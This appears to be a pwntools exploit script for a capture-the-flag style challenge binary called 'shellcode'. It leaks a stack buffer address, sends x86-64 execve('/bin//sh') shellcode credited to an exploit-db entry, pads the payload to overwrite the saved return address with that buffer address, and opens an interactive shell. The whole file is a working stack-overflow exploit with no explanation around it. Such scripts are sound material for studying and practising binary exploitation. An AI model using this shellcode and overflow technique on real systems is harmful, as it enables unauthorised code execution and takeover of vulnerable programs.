from pwn import *
context.log_level = "debug"
context.arch = "amd64"
p = process("./shellcode")

shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05' #23bytes
#https://www.exploit-db.com/exploits/46907
p.recvuntil("at ")
buf_address = int(p.recvline(),base=16)

success("Buffer[0]->" + hex(buf_address))

payload = shellcode + b'A' * 489 + b'B' * 8 + p64(buf_address)

p.sendafter(">",payload)


p.interactive()